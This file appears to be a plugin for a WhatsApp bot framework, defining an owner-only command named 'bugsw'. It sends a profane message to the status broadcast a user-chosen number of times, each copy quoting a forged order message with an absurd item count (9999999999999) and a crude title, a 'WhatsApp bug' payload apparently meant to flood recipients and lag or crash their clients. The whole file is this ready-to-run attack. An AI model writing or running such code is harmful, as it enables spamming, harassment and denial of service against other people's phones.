let handler = async (m, { conn, args, text, isPrems, isOwner }) => {
for (let i = 0; i < args[0]; i++) {
	conn.sendMessage('status@broadcast', `jancok`, m.mtype,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 9999999999999,
status: 1,
surface: 10,
orderTitle: 'Bug Tai',
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
}
		
handler.help = ['bugsw <berapa>?']
handler.tags = ['owner']
handler.customPrefix = /(\?$)/
handler.command = /^bugsw/i
handler.owner = true
handler.mods = false
handler.premium = false
handler.group = false
handler.private = false

handler.admin = false
handler.botAdmin = false

handler.fail = null

module.exports = handler